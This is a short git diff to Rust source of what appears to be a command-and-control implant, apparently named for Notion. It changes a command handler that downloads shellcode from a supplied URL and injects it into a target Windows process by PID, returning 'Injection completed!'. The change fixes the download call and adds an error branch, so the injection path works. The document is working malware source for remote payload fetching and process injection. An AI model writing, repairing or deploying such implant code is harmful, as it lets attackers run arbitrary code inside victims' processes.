@@ -150,9 +150,10 @@ impl NotionCommand {
                     let url = args.nth(0).unwrap();
                     // Get path as the 2nd arg or the last part of the URL
                     if let Some(p) = args.nth(0) {
+                        println!("Injecting into PID {:?}", p);
                         let pid: u32 = p.parse()?;
                         let client = Client::new();
-                        let r = client.get(s).send().await?;
+                        let r = client.get(url).send().await?;
                         if r.status().is_success() {
                             // Here comes the injection
                             let shellcode = r.bytes().await?;
@@ -167,6 +168,8 @@ impl NotionCommand {
                                 kernel32::CloseHandle(h);
                             }
                             return Ok("Injection completed!".to_string());
+                        } else {
+                            return Ok("Could not download shellcode".to_string());
                         }
                         
                     } else {
@@ -177,9 +180,6 @@ impl NotionCommand {
                 #[cfg(not(windows))] {
                     return Ok("Can only inject shellcode on Windows!".to_string());
                 }
-
-
-                return Ok(String::from("Not yet implemented!"));
             },
             CommandType::Shutdown => {
                 return Ok(String::from("Shutting down"));
